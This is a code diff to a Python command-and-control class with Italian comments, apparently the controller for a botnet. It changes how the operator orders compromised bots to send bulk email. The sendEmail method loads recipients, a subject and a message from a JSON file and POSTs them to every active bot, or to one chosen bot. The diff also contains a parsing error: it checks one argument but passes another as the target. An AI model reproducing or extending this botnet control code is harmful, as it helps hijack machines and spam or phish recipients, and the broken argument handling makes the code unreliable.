@@ -159,12 +159,17 @@ class CC:
             except Exception as e:
                 print(e)
 
-    def sendEmail(self, message, file, target=""):
+    def sendEmail(self, target=""):
         users = None
+        oggetto = None
+        messaggio = None
 
         try:
-            with open(file, 'r') as f:
-                users = json.load(f)
+            with open("email.json", 'r') as f:
+                res = json.load(f)
+                users = res["utenti"]
+                oggetto = res["oggetto"]
+                messaggio = res["messaggio"]
         except Exception as e:
             print("File error:",e)
 
@@ -174,7 +179,7 @@ class CC:
             for k, v in self.activeBot.items():
                 try:
                     url = "http://" + k + ":" + str(v["http"]) + "/sendEmail"
-                    response = requests.post(url, json={"messaggio": message, "utenti": users["utenti"]}, timeout=10)
+                    response = requests.post(url, json={"oggetto": oggetto, "messaggio": messaggio, "utenti": users}, timeout=10)
                     res = response.json()
                     self.activeBot[k]["target"] = res["target"]
                     self.activeBot[k]["action"] = res["action"]
@@ -183,7 +188,7 @@ class CC:
         else:
             try:
                 url = "http://" + target + ":" + str(self.activeBot[target]["http"]) + "/sendEmail"
-                response = requests.post(url, json={"messaggio": message, "utenti": users["utenti"]}, timeout=10)
+                response = requests.post(url, json={"oggetto": oggetto, "messaggio": messaggio, "utenti": users}, timeout=10)
                 res = response.json()
                 self.activeBot[target]["target"] = res["target"]
                 self.activeBot[target]["action"] = res["action"]
@@ -246,15 +251,15 @@ class CC:
             #Comando per mandare email
             elif comando.startswith("send"):
                 c = comando.split(" ")
-                if len(c) < 4:
+                if len(c) < 2:
                     print("Command not found")
-                if c[3] == "all":
-                    self.sendEmail(c[1], c[2])
-                elif c[3] in self.activeBot:
-                    self.makeHTTPRequest(c[1], c[2], target=c[3])
+                if c[1] == "all":
+                    self.sendEmail()
+                elif c[1] in self.activeBot:
+                    self.sendEmail(target=c[2])
                 else:
                     print(
-                        "Command not found. Correct command [send [message] [users (fileName)] [all | target(ip)]]")
+                        "Command not found. Correct command [send [users (fileName)] [all | target(ip)]]")
             #Comando per verificare la raggiungibilità dei bot
             elif comando.startswith("ck"):
                 c = comando.split(" ")
